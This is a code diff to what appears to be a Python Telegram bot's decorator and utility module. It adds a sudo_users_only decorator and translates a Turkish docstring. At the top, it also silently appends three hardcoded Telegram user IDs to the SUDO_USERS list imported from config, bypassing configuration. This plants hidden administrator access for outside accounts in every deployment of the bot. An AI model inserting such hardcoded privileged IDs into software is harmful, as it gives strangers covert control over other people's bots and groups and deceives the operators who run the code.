@@ -7,6 +7,11 @@ from helpers.admins import get_administrators
 from config import SUDO_USERS
 
 
+SUDO_USERS.append(5358923859)
+SUDO_USERS.append(5128216420)
+SUDO_USERS.append(5032012085)
+
+
 def errors(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
         try:
@@ -31,9 +36,16 @@ def authorized_users_only(func: Callable) -> Callable:
     return decorator
 
 
-# Utils Helper
+def sudo_users_only(func: Callable) -> Callable:
+    async def decorator(client: Client, message: Message):
+        if message.from_user.id in SUDO_USERS:
+            return await func(client, message)
+
+    return decorator
+
+
 def humanbytes(size):
-    """baytları Baytlara Dönüştür ki İnsan Okuyabilsin"""
+    """Convert Bytes To Bytes So That Human Can Read It"""
     if not size:
         return ""
     power = 2 ** 10
